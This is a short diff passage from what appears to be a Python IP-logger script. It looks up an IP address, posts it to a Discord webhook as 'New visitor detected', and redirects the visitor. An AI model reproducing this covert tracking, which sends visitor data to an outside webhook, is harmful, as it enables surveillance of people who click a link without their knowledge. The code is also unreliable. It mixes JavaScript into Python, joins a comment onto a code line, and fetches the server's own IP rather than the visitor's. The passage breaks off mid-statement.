@@ -13,6 +13,6 @@ IP_ADDRESS = requests.get('https://api.ipify.org').text
 
 # Send the IP address to the Discord webhook
 data = {'content': f"New visitor detected: {IP_ADDRESS}"}
-requests.post(WEBHOOK_URL, json=data)
-# Redirect to the specified link
-location.replace(REDIRECT_LINK)
+requests.post(WEBHOOK_URL, json=data)# Set the redirect status code
+print("HTTP/1.1 302 Found")
+print(f"
